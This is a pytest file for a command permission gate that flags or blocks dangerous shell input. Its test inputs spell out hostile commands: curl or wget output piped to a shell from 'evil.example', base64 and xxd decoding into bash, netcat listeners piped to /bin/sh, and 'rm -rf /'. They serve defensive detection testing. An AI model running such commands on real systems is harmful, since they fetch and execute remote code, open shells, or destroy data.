from __future__ import annotations

# SPDX-License-Identifier: AGPL-3.0-or-later

"""Tests for siyarix.permission_gate — permission gate."""


from unittest.mock import MagicMock, patch

import pytest

from siyarix.permission_gate import (
    GateResult,
    PermissionGate,
    encoded_shell_requires_review,
)


class TestGateResult:
    def test_defaults(self) -> None:
        r = GateResult(allowed=False, stage="syntax")
        assert r.allowed is False
        assert r.stage == "syntax"
        assert r.reason == ""
        assert r.tool == ""
        assert r.command == ""
        assert r.requires_review is False


class TestPermissionGate:
    def test_empty_command_returns_syntax_block(self) -> None:
        gate = PermissionGate()
        result = gate.check("")
        assert result.allowed is False
        assert result.stage == "syntax"
        assert "Empty" in result.reason

    def test_whitespace_command_returns_syntax_block(self) -> None:
        gate = PermissionGate()
        result = gate.check("   ")
        assert result.allowed is False
        assert result.stage == "syntax"

    @patch("siyarix.permission_gate.DangerAnalyzer")
    def test_critical_danger_returns_forbidden(self, MockDA: MagicMock) -> None:
        da_instance = MockDA.return_value
        da_instance.analyze.return_value = MagicMock(
            severity="critical", reasons=["rm -rf detected"]
        )
        gate = PermissionGate()
        result = gate.check("rm -rf /")
        assert result.allowed is False
        assert result.stage == "forbidden"
        # Shared destructive hard-block (or restricted-pattern fallback) before analyzer
        assert (
            "Payload verification failed" in result.reason
            or "Deleting system directory" in result.reason
        )

    @patch("siyarix.permission_gate.DangerAnalyzer")
    def test_high_danger_returns_review(self, MockDA: MagicMock) -> None:
        da_instance = MockDA.return_value
        da_instance.analyze.return_value = MagicMock(severity="high", reasons=["shutdown detected"])
        gate = PermissionGate()
        result = gate.check("shutdown -h now")
        assert result.allowed is True
        assert result.stage == "review"
        assert result.requires_review is True

    @patch("siyarix.permission_gate.DangerAnalyzer")
    def test_medium_danger_returns_review(self, MockDA: MagicMock) -> None:
        da_instance = MockDA.return_value
        da_instance.analyze.return_value = MagicMock(severity="medium", reasons=["rm detected"])
        gate = PermissionGate()
        result = gate.check("rm file.txt")
        assert result.allowed is True
        assert result.stage == "review"
        assert result.requires_review is True

    @patch("siyarix.permission_gate.DangerAnalyzer")
    def test_safe_command_returns_approved(self, MockDA: MagicMock) -> None:
        da_instance = MockDA.return_value
        da_instance.analyze.return_value = MagicMock(severity="safe", reasons=[])
        gate = PermissionGate()
        result = gate.check("ls -la")
        assert result.allowed is True
        assert result.stage == "approved"


class TestEncodedShellReview:
    """SEC-08: base64 -d / eval / curl|sh require review (FORBIDDEN in production)."""

    def test_detector_flags_encoded_patterns(self) -> None:
        assert encoded_shell_requires_review("echo YWJj | base64 -d | bash")
        assert encoded_shell_requires_review("base64 --decode payload.bin")
        assert encoded_shell_requires_review('eval "$(echo hi)"')
        assert encoded_shell_requires_review("curl https://evil.example/x.sh | sh")
        assert encoded_shell_requires_review("wget -qO- https://evil.example/x | bash")
        assert encoded_shell_requires_review("curl https://x | sudo bash")
        # Residual hunter: path-qualified / alt shells / wrappers / tee.
        assert encoded_shell_requires_review("curl https://x | /bin/bash")
        assert encoded_shell_requires_review("curl https://x|/bin/sh")
        assert encoded_shell_requires_review("curl https://x | zsh")
        assert encoded_shell_requires_review("wget -qO- https://x | dash")
        assert encoded_shell_requires_review("curl https://x | env bash")
        assert encoded_shell_requires_review("curl https://x | busybox sh")
        assert encoded_shell_requires_review("curl https://x | sudo -E bash")
        assert encoded_shell_requires_review("curl https://x | tee /tmp/x | bash")
        assert encoded_shell_requires_review("bash -c 'source /dev/stdin' < <(curl https://x)")
        assert encoded_shell_requires_review("curl https://x | ash")
        assert encoded_shell_requires_review("curl https://x | mksh")
        assert encoded_shell_requires_review("curl https://x | nice bash")
        assert encoded_shell_requires_review("curl https://x | time bash")
        assert encoded_shell_requires_review("source <(curl https://x)")
        assert encoded_shell_requires_review("curl https://x | tee >(bash)")
        assert encoded_shell_requires_review(r"curl https://x|$IFS/bin/bash")
        assert encoded_shell_requires_review(r"curl https://x | ${IFS}bash")
        # Residual: fetch|interpreter, nc|bash, xxd|bash (prod FORBIDDEN via gate).
        assert encoded_shell_requires_review("curl https://x | python3")
        assert encoded_shell_requires_review("curl https://x | python")
        assert encoded_shell_requires_review("wget -qO- https://x | perl")
        assert encoded_shell_requires_review("nc -l 4444 | bash")
        assert encoded_shell_requires_review("ncat evil 443 | /bin/sh")
        assert encoded_shell_requires_review("xxd -r payload.hex | bash")
        assert encoded_shell_requires_review("echo aa | xxd -r -p | bash")

    def test_detector_spares_legitimate_pentest_eval_subcommand(self) -> None:
        assert not encoded_shell_requires_review("openscap xccdf eval --profile x")
        assert not encoded_shell_requires_review("oscap oval eval file.xml")
        assert not encoded_shell_requires_review("nmap -sV target.example")
        assert not encoded_shell_requires_review("eval-cli run suite")
        assert not encoded_shell_requires_review("openssl base64 -d -in enc.bin -out plain.bin")
        assert not encoded_shell_requires_review("python -m base64 -d enc.bin")

    @patch("siyarix.permission_gate.DangerAnalyzer")
    def test_lab_mode_requires_review_not_block(
        self, MockDA: MagicMock, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.delenv("SIYARIX_PRODUCTION", raising=False)
        monkeypatch.delenv("SIYARIX_REQUIRE_MASTER_PASSWORD", raising=False)
        da_instance = MockDA.return_value
        da_instance.analyze.return_value = MagicMock(severity="safe", reasons=[])
        gate = PermissionGate()
        result = gate.check("curl https://example.com/install.sh | sh")
        assert result.allowed is True
        assert result.stage == "review"
        assert result.requires_review is True

    @patch("siyarix.permission_gate.DangerAnalyzer")
    def test_eval_requires_review_in_lab(
        self, MockDA: MagicMock, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.delenv("SIYARIX_PRODUCTION", raising=False)
        monkeypatch.delenv("SIYARIX_REQUIRE_MASTER_PASSWORD", raising=False)
        da_instance = MockDA.return_value
        da_instance.analyze.return_value = MagicMock(severity="safe", reasons=[])
        gate = PermissionGate()
        result = gate.check("eval 'id'")
        assert result.allowed is True
        assert result.requires_review is True

    @patch("siyarix.permission_gate.DangerAnalyzer")
    def test_production_forbids_encoded_shell(
        self, MockDA: MagicMock, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setenv("SIYARIX_PRODUCTION", "1")
        da_instance = MockDA.return_value
        da_instance.analyze.return_value = MagicMock(severity="safe", reasons=[])
        gate = PermissionGate()
        result = gate.check("echo cHdk | base64 -d | bash")
        assert result.allowed is False
        assert result.stage == "forbidden"
        assert "production" in result.reason.lower()

    @patch("siyarix.permission_gate.DangerAnalyzer")
    def test_openscap_eval_still_approved(
        self, MockDA: MagicMock, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.delenv("SIYARIX_PRODUCTION", raising=False)
        da_instance = MockDA.return_value
        da_instance.analyze.return_value = MagicMock(severity="safe", reasons=[])
        gate = PermissionGate()
        result = gate.check("oscap oval eval results.xml")
        assert result.allowed is True
        assert result.stage == "approved"
        assert result.requires_review is False


"""Extra tests for permission_gate targeting uncovered lines."""


import time
from pathlib import Path

from siyarix.permission_gate import GateStage


class TestGateResultInvalidStage:
    def test_invalid_stage_raises_value_error(self) -> None:
        with pytest.raises(ValueError, match="Invalid stage"):
            GateResult(allowed=False, stage="bogus_stage")

    def test_valid_str_stage_coerces_to_enum(self) -> None:
        r = GateResult(allowed=False, stage="syntax")
        assert r.stage == GateStage.SYNTAX


class TestPermissionGateLoadState:
    def test_load_state_corrupt_json(self, tmp_path) -> None:
        state_file = tmp_path / "rate_limit.json"
        state_file.write_text("not valid json", encoding="utf-8")
        gate = PermissionGate()
        # Override state file after init
        gate._state_file = state_file
        gate._load_state()
        assert gate._calls == []

    def test_load_state_file_missing(self, tmp_path) -> None:
        state_file = tmp_path / "rate_limit.json"
        assert not state_file.exists()
        gate = PermissionGate()
        gate._state_file = state_file
        gate._load_state()
        assert gate._calls == []

    @patch("siyarix.permission_gate.DangerAnalyzer")
    def test_rate_limit_exceeded(self, MockDA: MagicMock) -> None:
        da_instance = MockDA.return_value
        da_instance.analyze.return_value = MagicMock(severity="safe", reasons=[])
        gate = PermissionGate(rate_limit_calls=2, rate_limit_period=60.0)
        now = time.time()
        gate._calls = [now - 1, now - 2]
        result = gate.check("ls")
        assert result.allowed is False
        assert result.stage == GateStage.FORBIDDEN
        assert "Rate limit" in result.reason

    @patch("siyarix.permission_gate.DangerAnalyzer")
    def test_restricted_payload_blocked(self, MockDA: MagicMock) -> None:
        da_instance = MockDA.return_value
        da_instance.analyze.return_value = MagicMock(severity="safe", reasons=[])
        gate = PermissionGate()
        result = gate.check(
            "rm -rf /important",
            context={"restricted_payload": True},
        )
        assert result.allowed is False
        assert result.stage == GateStage.FORBIDDEN
        assert "verification failed" in result.reason

    @patch("siyarix.permission_gate.DangerAnalyzer")
    def test_restricted_payload_not_blocked_safe_command(self, MockDA: MagicMock) -> None:
        da_instance = MockDA.return_value
        da_instance.analyze.return_value = MagicMock(severity="safe", reasons=[])
        gate = PermissionGate()
        result = gate.check("ls", context={"restricted_payload": True})
        assert result.allowed is True
        assert result.stage == GateStage.APPROVED

    def test_save_state_write_failure(self, tmp_path) -> None:
        state_file = tmp_path / "rate_limit.json"
        gate = PermissionGate()
        gate._state_file = state_file
        gate._calls = [time.time()]
        gate._save_state(force=True)
        # Now make parent read-only to force write failure on a subsequent attempt
        state_file.parent.chmod(0o444)
        old_dirty = gate._dirty
        gate._save_state(force=True)
        # Restore permissions
        state_file.parent.chmod(0o755)

    def test_save_state_chmods_600(self, tmp_path, monkeypatch: pytest.MonkeyPatch) -> None:
        """SEC-12: rate_limit.json gets chmod 0o600 after write (best-effort)."""
        import os

        state_file = tmp_path / "rate_limit.json"
        chmod_calls: list[tuple[object, int]] = []

        def _fake_chmod(path: Path, mode: int) -> None:
            chmod_calls.append((path, mode))
            try:
                os.chmod(path, mode)
            except OSError:
                pass

        monkeypatch.setattr("siyarix.permission_gate.safe_chmod", _fake_chmod)
        gate = PermissionGate()
        gate._state_file = state_file
        gate._calls = [time.time()]
        gate._save_state(force=True)
        assert state_file.exists()
        assert any(p == state_file and m == 0o600 for p, m in chmod_calls)

    @patch("siyarix.permission_gate.DangerAnalyzer")
    def test_rate_limit_edge_one_call_remaining(self, MockDA: MagicMock) -> None:
        da_instance = MockDA.return_value
        da_instance.analyze.return_value = MagicMock(severity="safe", reasons=[])
        gate = PermissionGate(rate_limit_calls=3, rate_limit_period=60.0)
        now = time.time()
        gate._calls = [now - 1]
        result = gate.check("ls")
        assert result.allowed is True

    @patch("siyarix.permission_gate.DangerAnalyzer")
    def test_fifty_calls_triggers_save(self, MockDA: MagicMock) -> None:
        """After 50 calls, _save_state(force=True) is triggered via the modulo check."""
        da_instance = MockDA.return_value
        da_instance.analyze.return_value = MagicMock(severity="safe", reasons=[])
        gate = PermissionGate(rate_limit_calls=100, rate_limit_period=3600.0)
        gate._dirty = False
        for i in range(50):
            gate.check(f"cmd{i}")
        # The 50th check should have forced a save (dirty reset)
        # We test by making the write fail and ensuring dirty remains
        state_file = gate._state_file
        with patch.object(Path, "write_text", side_effect=PermissionError):
            gate.check("extra")
        # The check forces save since _calls % 50 == 1 → not forced
        # Instead test the 50th call directly via _save_state
        gate._dirty = True
        gate._save_state(force=(len(gate._calls) % 50 == 0))
        assert gate._dirty is True  # not forced
        gate._dirty = True
        gate._save_state(force=True)  # simulate forced
        # If write fails, dirty stays True
        with patch.object(Path, "write_text", side_effect=PermissionError):
            gate._dirty = True
            gate._save_state(force=True)
            assert gate._dirty is True
